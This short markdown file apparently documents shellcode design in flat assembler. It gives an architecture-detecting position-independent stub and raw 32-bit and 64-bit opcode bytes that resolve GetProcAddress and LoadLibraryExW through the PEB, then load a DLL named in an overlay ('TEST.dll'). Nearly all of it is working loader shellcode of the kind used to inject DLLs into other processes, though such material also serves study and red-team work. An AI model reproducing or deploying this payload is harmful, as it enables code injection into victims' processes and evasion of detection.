
## shellcode design
thank [flatassembler](https://flatassembler.net)


### auto exec code(32bit/64bit)
```
    use64
    call $+5
    pop rcx ; get pc
    add rcx, @OVERLAY-$+1 ; overlay offset
    call @AUTORUN
    ret
@RETV:
    dq 0, 0 ; ret buffer

@AUTORUN:
    call @CHKENV32
    test rax, rax
    je @ENV64
@ENV32:
    use32
    call CALL32
    mov ecx, [esp]
    lea ecx, [ecx+1]
    mov [ecx], eax
    jmp @DONE
@ENV64:
    use64
    call CALL64
    mov rcx, [rsp]
    lea rcx, [rcx+1]
    mov [rcx], rax
@DONE:
    ret

@CHKENV32:
    db 31h, 0C0h, 48h, 0Fh, 88h, 00h, 00h, 00h, 00h, 0C3h
```


### Wrapper LoadLibraryExW [extract function address in PEB](https://github.com/NytroRST/ShellcodeCompiler)
```
CALL32:
    use32
    push ecx
    call @LOADEXW32
    pop ecx
PROC32:
    push 0
    push 0
    push ecx
    call eax    ; LoadLibraryExW
    ret

CALL64:
    use64
    push rcx
    sub rsp, 0x30
    call @LOADEXW64
    add rsp, 0x30
    pop rcx
PROC64:
    sub rsp, 0x28
    xor r8d, r8d
    xor rdx, rdx
    call rax    ; LoadLibraryExW
    add rsp, 0x28
    ret


; 64: PEB->kernel32.LoadLibraryExW 
@LOADEXW64:
48 83 EC 28 48 83 E4 F0 48 31 C9 65 48 8B 41 60 
48 8B 40 18 48 8B 70 20 48 AD 48 96 48 AD 48 8B 
58 20 4D 31 C0 44 8B 43 3C 4C 89 C2 48 01 DA 48 
31 C9 B1 88 48 01 D1 44 8B 01 49 01 D8 48 31 F6 
41 8B 70 20 48 01 DE 48 31 C9 49 B9 47 65 74 50 
72 6F 63 41 48 FF C1 48 31 C0 8B 04 8E 48 01 D8 
4C 39 08 75 EF 48 31 F6 41 8B 70 24 48 01 DE 66 
8B 0C 4E 48 31 F6 41 8B 70 1C 48 01 DE 48 31 D2 
8B 14 8E 48 01 DA 48 89 D7 B9 61 72 79 41 51 48 
B9 4C 6F 61 64 4C 69 62 72 51 48 89 E2 48 89 D9 
48 83 EC 30 FF D7 48 83 C4 30 48 83 C4 10 48 89 
C6 48 31 C0 48 B8 61 72 79 45 78 57 00 00 50 48 
B8 4C 6F 61 64 4C 69 62 72 50 48 89 E2 48 89 D9 
48 83 EC 30 FF D7 48 83 C4 40 48 83 C4 28 C3

; 32: PEB->kernel32.LoadLibraryExW
@LOADEXW32:
31 C9 64 8B 41 30 8B 40 0C 8B 70 14 AD 96 AD 8B
58 10 8B 53 3C 01 DA 8B 52 78 01 DA 8B 72 20 01
DE 31 C9 41 AD 01 D8 81 38 47 65 74 50 75 F4 81
78 04 72 6F 63 41 75 EB 81 78 08 64 64 72 65 75
E2 8B 72 24 01 DE 66 8B 0C 4E 49 8B 72 1C 01 DE
8B 14 8E 01 DA 31 C9 53 52 51 68 61 72 79 41 68
4C 69 62 72 68 4C 6F 61 64 54 53 FF D2 83 C4 0C
59 50 31 C0 66 B8 78 57 50 68 61 72 79 45 68 4C
69 62 72 68 4C 6F 61 64 54 FF 74 24 1C FF 54 24
1C 83 C4 10 83 C4 0C C3
```

## overlay
```
; MODULE PATH
@OVERLAY:
du 'TEST.dll', 0
```
